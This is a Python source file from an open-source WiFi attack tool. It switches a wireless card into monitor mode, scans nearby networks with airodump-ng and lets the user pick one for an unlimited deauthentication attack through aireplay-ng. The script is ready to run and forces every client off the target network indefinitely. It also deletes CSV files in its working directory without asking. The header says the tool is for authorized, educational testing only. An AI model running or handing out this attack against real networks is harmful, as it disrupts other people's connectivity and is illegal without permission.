#!/usr/bin/env python

"""
WIFIHacker - Wireless Penetration Testing Tool
----------------------------------------------

Author      : Karthikeyan (https://karthithehacker.com)
GitHub      : https://github.com/karthi-the-hacker
Project     : WIFIHacker - A tool for WiFi auditing, penetration testing, and security assessments.

License     : Open-source for educational and ethical hacking purposes ONLY.

Note to Users:
--------------
🔐 This tool is meant strictly for educational, research, and authorized security testing.
🚫 Unauthorized use of this tool on networks you don’t own or have permission to test is illegal.
❗ If you use or modify this code, GIVE PROPER CREDIT to the original author.

Warning to Code Thieves:
------------------------
❌ Removing this header or claiming this project as your own without credit is unethical and against the open-source community principles.
🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
✅ Be an ethical hacker. Respect developers' hard work and give credit where it's due.

"""
from includes import utils
from includes import banner
from rich.console import Console
from rich.panel import Panel
import subprocess
import time
import re
import os
from rich.console import Console
from rich.panel import Panel
import csv

console = Console()

def parse_csv(file_path):
    wifi_targets = []
    with open(file_path, newline='') as csvfile:
        reader = csv.reader(csvfile)
        found_header = False
        for row in reader:
            if not row:
                continue
            if row[0].strip() == 'BSSID':
                found_header = True
                continue
            if found_header:
                if len(row) >= 14:
                    bssid = row[0].strip()
                    essid = row[13].strip()
                    channel = row[3].strip()
                    if essid:
                        wifi_targets.append((bssid, essid,channel))
    return wifi_targets


def get_wifi_targets(monitor_iface):
    console.print("[yellow]📡 Scanning for WiFi networks... 10-second scan. Press Ctrl+C to stop.[/yellow]")
    print(monitor_iface)
    os.system('rm *.csv')
    output_file = "scan_output"
    
    try:
        banner.show_banner()
        try:
            selected = int(input("🛜  Enter seconds to scan WiFi networks: ").strip() or 10)
        except ValueError:
            print("❌ Invalid input! Using default 10 seconds.")
            selected = 10
        console.print("[yellow bold]⏳ Starting WiFi scan in 5 seconds...[/yellow bold]")
        console.print("[yellow]⚠️ It will run for 10 seconds. Please do not interrupt any commands during this time.\n[/yellow]")
        for i in range(5, 0, -1):
            
            console.print(f"[cyan]Starting in {i}...[/cyan]", end="\r")
            time.sleep(1)
        command = f"sudo airodump-ng {monitor_iface} --output-format csv --write {output_file}"
        os.system(f"{command} &")
        time.sleep(selected)
        os.system("pkill airodump-ng")
        time.sleep(1)
        console.print("[green]📄 Showing scan output from the CSV file(s):[/green]")
        for file in os.listdir():
            if file.endswith(".csv"):
                with open(file, 'r') as f:
                    wifi_data = parse_csv(file)
        return wifi_data
    except Exception as e:
        console.print(f"[red]❌ Error: {e}[/red]")

def enable_monitor_mode(interface):
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["iw", interface, "set", "monitor", "none"], check=True)
        subprocess.run(["ip", "link", "set", interface, "up"], check=True)
        console.print(f"[green]✅ {interface} is now in monitor mode.[/green]")
    except subprocess.CalledProcessError:
        console.print(f"[red]❌ Failed to enable monitor mode on {interface}[/red]")
        exit()

def deauth_attack(interface, bssid, channel):
    subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    console.print(f"\n[red]⚠️ Starting deauth attack on {bssid} (channel {channel})...[/red]\n")
    try:
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])
    except KeyboardInterrupt:
        time.sleep(2)
        console.print("\n[cyan]🛑 Deauth attack stopped by user[/cyan]\n")


def start_deauth(interface):
    enable_monitor_mode(interface)
    banner.show_banner()
    targets = get_wifi_targets(interface)

    if not targets:
        console.print("[red]❌ No WiFi targets found. Exiting...[/red]")
        return

    banner.show_wifi_targets(targets)  
    
    selected = input("🛜  Enter your WiFi target  (number): ").strip()
    try:
        if selected.strip() == "0":
            exit()  
        target = targets[int(selected) - 1]
    except (IndexError, ValueError):
        banner.invalid_Selection()
        exit()

        
    deauth_attack(interface,target[0],target[2])
        

  